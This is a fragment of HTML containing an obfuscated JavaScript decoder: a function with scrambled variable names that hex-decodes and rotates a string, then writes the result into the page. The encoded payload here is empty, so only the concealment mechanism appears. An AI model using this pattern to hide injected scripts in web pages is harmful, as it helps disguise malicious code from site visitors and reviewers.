<SCRIPT LANGUAGE="JavaScript"> 
function o(xkvv1,k){ 
	var xkv,xkvv,xkvvf,xkvvff; 
	xkvv=0;               
	xkvvf="";           
	while (xkvv<xkvv1.length){  
		xkvvff = xkvv1.substr(xkvv,2);    
		xkvvf = xkvvf + String.fromCharCode("0x"+xkvvff);
	  xkvv=xkvv+2;     
	}           
	xkv=xkvvf.length;  
	xkvvf =xkvvf.substr(xkv-k+1,xkv)+xkvvf.substr(0,xkv-k+1);
	return xkvvf ; 
}     
</SCRIPT>  
<SCRIPT LANGUAGE="JavaScript"> var n ="";document.write(o(n,404));</SCRIPT>
